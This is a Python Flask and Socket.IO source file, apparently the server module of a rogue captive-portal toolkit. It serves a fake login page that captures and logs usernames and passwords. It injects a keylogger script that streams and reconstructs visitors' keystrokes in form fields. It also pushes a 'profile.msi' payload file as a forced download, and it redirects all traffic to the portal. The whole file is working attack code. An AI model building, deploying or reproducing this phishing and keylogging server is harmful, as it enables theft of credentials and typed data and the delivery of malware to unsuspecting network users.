import json
import logging
import core.wskeyloggerd.tables as tables
import os
import hashlib
import random
import string
import core.wskeyloggerd.loggers as loggers

from flask import Flask
from flask import make_response
from flask import render_template
from flask import request
from flask import redirect
from flask import send_from_directory
from flask import send_file
from flask import url_for

from flask_socketio import SocketIO, emit
from datetime import datetime
from urllib.parse import urlencode
from urllib.parse import quote_plus

logging.basicConfig(filename='wskeylogger.log', level=logging.INFO)

event_logger = loggers.EventLogger()
user_logger = loggers.UserLogger()
keystroke_logger = loggers.KeystrokeLogger()

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret'
socketio = SocketIO(app)
hosts = {}
configs = None

portal_route = '/login'
eh_template_dir = 'dont_touch'
login_template = 'login.html'

keylogger_script_route = '/wks'
keylogger_script_template = os.path.join(eh_template_dir, 'wsk.min.js')

socketio_script_route = '/sio'
socketio_script_template = os.path.join(eh_template_dir, 'socket.io.min.js')

ws_namespace = '/test'
redir_param = 'orig_url'

msg_details_param = 'jskdetails'
send_details_event = 'send_details'

keydown_event = 'keydown'
connect_event = 'connect'
disconnect_event = 'disconnect'

connect_event_response_msg = 'confirm connection'

form_name = 'static/payloads/profile.msi'

# utils -----------------------------------------------------------------------

def plog(message):

    print(message)
    event_logger.log(message)

def gen_view_state():
    return ''.join(random.choice(string.printable) for x in range(32)).encode()

def build_redirect_url(req_url):

    query_params = { redir_param : req_url }

    options = app.config['options']
    lhost = options['portal_lhost']
    lport = options['portal_lport']
    proto = 'https' if options['portal_https'] else 'http'

    url_base = "{}://{}:{}{}?".format(proto, lhost, lport, portal_route)

    query_string = urlencode(query_params, quote_via=quote_plus)

    redirect_url = url_base + query_string

    return redirect_url

# captive portal --------------------------------------------------------------

@app.route('/serve', methods=['GET'])
def serve():

    options = app.config['options']
    lhost = options['portal_lhost']
    lport = options['portal_lport']

    if 'view_state' not in request.cookies:

        plog('[*] view_state not in request.cookies')

        redirect_url = build_redirect_url(request.url)
        plog('[*] download(): Redirecting to: {}'.format(redirect_url))

        return redirect(redirect_url)

    view_state = request.cookies['view_state']

    plog('[*] Got view_state: {}'.format(view_state))

    user_logger.log(view_state=view_state,
                                page_view='serve',
                                file_download='True',
                                method='GET')
    return send_file(form_name, as_attachment=True)

@app.route(portal_route, methods=['GET', 'POST'])
def login():
    
    options = app.config['options']
    lhost = options['portal_lhost']
    lport = options['portal_lport']
    user_template = options['portal_user_template']

    print('[*] user_template is', user_template)


    if request.method == 'POST':

        # redirect to GET login if view_state cookie not present
        if 'view_state' not in request.cookies:

    
            redirect_url = build_redirect_url(request.url)

            plog('[*] Login(): Redirecting to: {}'.format(redirect_url))

            return redirect(redirect_url)

        else:

            plog('[*] Received post request')

            username = request.form['username']
            password = request.form['password']

            plog('[*] Caught username: {}'.format(username))
            plog('[*] Caught password: {}'.format(password))

            plog('[*] Crafting response')

            response = make_response(redirect(url_for('login')))

            plog('[*] Returning crafted response')

            view_state = request.cookies.get('view_state', 'notset')

            user_logger.log(view_state=view_state,
                        page_view=portal_route,
                        username=username,
                        password=password,
                        method='POST')
            
            return response 

    else:

        # this is to resolve potential CORS issues
        if ':' in request.host and request.host != '{}:{}'.format(lhost,lport):

            redirect_url = build_redirect_url(request.url)

            plog('[*] Login(): Redirecting to: {}'.format(redirect_url))

            return redirect(redirect_url)

        elif request.host != lhost:

            print('request.host is', request.host)

            redirect_url = build_redirect_url(request.url)

            plog('[*] Login(): Redirecting to: {}'.format(redirect_url))

            return redirect(redirect_url)

        else:

            plog('[*] Rendering %s template' % login_template)

            if 'view_state' not in request.cookies:

                plog('[*] New user detected, generating "view_state" cookie')
                view_state = hashlib.md5(gen_view_state()).hexdigest()

                rendered_template = render_template(login_template,
                                    serve_route=url_for('serve'),
                                    lhost=lhost,
                                    lport=lport,
                                    user_template=user_template,
                                    socket_io_load_route=socketio_script_route,
                                    ws_namespace=ws_namespace,
                                    message_details_param=msg_details_param,
                                    send_details_event=send_details_event,
                                    keydown_event=keydown_event,
                                    connect_event=connect_event,
                                    disconnect_event=disconnect_event,
                                    view_state=view_state)

                plog('[*] Crafting response using rendered template')
                response = make_response(rendered_template)

                plog('[*] Setting view_state cookie to {}'.format(view_state))
                response.set_cookie('view_state', view_state)

            else:

                plog('[*] Existing user detected, '
                     'using existing "view_state" cookie')

                view_state = request.cookies['view_state']

                rendered_template = render_template(login_template,
                                    serve_route=url_for('serve'),
                                    user_template=user_template,
                                    lhost=lhost,
                                    lport=lport,
                                    socket_io_load_route=socketio_script_route,
                                    ws_namespace=ws_namespace,
                                    message_details_param=msg_details_param,
                                    send_details_event=send_details_event,
                                    keydown_event=keydown_event,
                                    connect_event=connect_event,
                                    disconnect_event=disconnect_event,
                                    view_state=view_state)

                plog('[*] Crafting response using rendered template')
                response = make_response(rendered_template)

            plog('[*] Returning crafted response')

            user_logger.log(view_state=view_state,
                            page_view='login',
                            method='GET')

            return response

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch_all(path):
    options = app.config['options']
    lhost = options['portal_lhost']
    lport = options['portal_lport']

    redirect_url = build_redirect_url(request.url)
    plog('[*] Login(): Redirecting to: {}'.format(redirect_url))

    return redirect(redirect_url)


# keylogger - static resources ------------------------------------------------

@app.route(socketio_script_route)
def load_socketio():

    options = app.config['options']
    lhost = options['portal_lhost']
    lport = options['portal_lport']

    jsfile = render_template(socketio_script_template,
                             lhost=lhost,
                             lport=lport)

    response = make_response(jsfile)
    response.headers['Content-Type'] = 'application/javascript'

    return response

@app.route(keylogger_script_route)
def load_keylogger_script():

    options = app.config['options']
    lhost = options['portal_lhost']
    lport = options['portal_lport']

    jsfile = render_template(keylogger_script_template,
                             lhost=lhost,
                             lport=lport)

    response = make_response(jsfile)

    response.headers['Content-Type'] = 'application/javascript'

    return response

# keylogger - socketio events -------------------------------------------------

@socketio.on(connect_event, namespace=ws_namespace)
def test_connect():

    emit(connect_event_response_msg, { 'data' : 'Connected' })

@socketio.on(send_details_event, namespace=ws_namespace)
def send_details_event_helper(message):

    details = message['page_details']

    host = details['url']['host']
    if host not in hosts:
        hosts[host] = {}

    clients = hosts[host]
    ip = request.remote_addr
    clients[ip] = {}
    client = clients[ip]

    for details in message[msg_details_param]:

        _id = details['_id']

        client[_id] = {

            '_id' : _id,
            'info' :  details,
            'contents' : [],
        }

@socketio.on(disconnect_event, namespace=ws_namespace)
def test_disconnect():

    plog('Client disconnected')

@socketio.on(keydown_event, namespace=ws_namespace)
def keydown(message):

    ip = request.remote_addr

    host = message['page_details']['url']['host']
    
    clients = hosts[host]
    client = clients[ip]

    text_field = message['data']['tag_details']
    _id = text_field['_id']
    contents = client[_id]['contents']
        
    keystroke = message['data']['ks']
    ctrl_pressed = message['data']['ctrl']
    alt_pressed = message['data']['alt']
    shift_pressed = message['data']['shift']
    selection_start = message['data']['start_pos']
    selection_end = message['data']['end_pos']
    view_state = message['data']['view_state']

    if ctrl_pressed or alt_pressed or not tables.is_printable(keystroke):
        return

    keystroke = tables.keyboard[keystroke]

    if keystroke == 'BACK_SPACE':

        if selection_start == selection_end and selection_start != 0:
            contents.pop(selection_start-1)
        else:
            del contents[selection_start:selection_end]

    elif keystroke == 'DELETE':

        if selection_start == selection_end and selection_end != len(contents):
            contents.pop(selection_start)
        else:
            del contents[selection_start:selection_end]
    else:
        
        if shift_pressed:

            if keystroke in tables.shift:
                keystroke = tables.shift[keystroke]
            elif keystroke.isalpha():
                keystroke = keystroke.upper()

        if selection_start != selection_end:
            del contents[selection_start:selection_end]

        contents.insert(selection_start, keystroke)

    
    keylog_entry = []
    options = app.config['options']
    keylog_entry.append(host)
    keylog_entry.append(ip)
    keylog_entry.append(message['page_details']['user_agent'])

    keylog_entry.append('<%s id="%s" class="%s" name="%s"> textval: %s' %\
        (message['data']['tag_details']['tag'],
         message['data']['tag_details']['id'],
         message['data']['tag_details']['class'],
         message['data']['tag_details']['name'],
         ''.join(contents)))

    keylog_entry = ' '.join(keylog_entry)
    
    plog(keylog_entry)

    keystroke_logger.log(view_state=view_state, entry=keylog_entry)

# driver function -------------------------------------------------------------

def run(settings, options):


    app.config['options'] = options
    app.config['settings'] = settings
    app.config['USE_RELOADER'] = False
    app.config['use_reloader'] = False
    if options['debug'] or options['portal_debug']:
        app.config['DEBUG'] = True


    print(1)
    if options['portal_https']:

        print(2)

        socketio.run(app,
                     host=options['portal_lhost'],
                     port=options['portal_lport'],
                     certfile=options['portal_cert'], 
                     keyfile=options['portal_private_key'])
    else:

        print(3)
        #socketio.run(app, host=options['portal_lhost'], port=options['portal_lport'], use_reloader=False)
        socketio.run(app, host=options['portal_lhost'], port=80, use_reloader=False)
